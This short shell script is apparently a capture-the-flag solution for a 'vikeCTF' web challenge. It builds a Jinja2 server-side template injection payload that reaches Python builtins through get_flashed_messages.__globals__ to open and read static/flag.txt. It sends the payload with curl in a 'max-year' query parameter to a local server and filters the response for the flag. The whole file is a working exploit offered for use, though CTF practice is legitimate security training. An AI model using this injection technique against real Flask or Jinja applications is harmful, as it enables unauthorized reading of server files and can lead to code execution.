#!/bin/sh

payload='{{ get_flashed_messages.__globals__.__builtins__.open("static/flag.txt").read() }}'

curl --get --data-urlencode "search=a" --data-urlencode "max-year=$payload" http://localhost:8000 | grep 'vikeCTF'
